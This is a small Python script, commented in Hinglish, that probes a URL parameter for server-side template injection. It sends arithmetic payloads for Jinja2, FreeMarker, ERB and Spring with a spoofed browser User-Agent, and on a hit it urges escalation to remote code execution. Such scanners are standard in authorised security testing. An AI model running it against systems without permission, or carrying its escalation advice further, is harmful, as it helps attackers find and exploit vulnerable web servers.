import requests
import sys

def ssti_fuzzer(base_url):
    print(f"\n[*] Bhai, starting SSTI (Server-Side Template Injection) Hunt on: {base_url}")
    print("[*] Testing various Template Engine payloads...\n")
    print("--------------------------------------------------")
    
    # The Hacker's Math Payloads (Har engine ka syntax alag hota hai)
    payloads = {
        "Jinja2 / Twig / Nunjucks": "{{7*7}}",
        "FreeMarker / Velocity": "${7*7}",
        "ERB / Tornado": "<%= 7*7 %>",
        "Spring (Java)": "*{7*7}"
    }

    found_bug = False

    # Ek-ek payload uthao aur URL ke parameter mein daal kar bhej do
    for engine, payload in payloads.items():
        target_url = f"{base_url}{payload}"
        print(f"[*] Injecting {engine} payload: {payload}")
        
        try:
            # Server ko bewakoof banane ke liye browser user-agent
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            response = requests.get(target_url, headers=headers, timeout=5)
            
            # THE MAGIC LOGIC:
            # Agar server ke source code mein '49' aa gaya, par '7*7' gayab hai, 
            # iska matlab server ne engine ke andar hamara math solve kar diya hai!
            if "49" in response.text and "7*7" not in response.text:
                print(f"\n   [!!!] JACKPOT 🎯 SSTI VULNERABILITY FOUND!")
                print(f"   [!!!] Vulnerable Template Engine: {engine}")
                print(f"   [!!!] Executed URL: {target_url}")
                print("   [!!!] Next Step: Escalate to RCE (Remote Code Execution)!\n")
                found_bug = True
                break # Ek baar bug mil gaya toh aur check karne ki zaroorat nahi
                
        except requests.exceptions.RequestException:
            print(f"   [-] Connection skipped/timeout for this payload.")

    if not found_bug:
        print("\n[-] No SSTI found. Server did not evaluate our math payloads.")

    print("--------------------------------------------------")
    print("[+] SSTI Hunt Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 ssti_hunter.py <url_with_parameter=>")
        print("Example: python3 ssti_hunter.py 'http://testphp.vulnweb.com/search.php?test='")
        sys.exit(1)
        
    target = sys.argv[1]
    ssti_fuzzer(target)
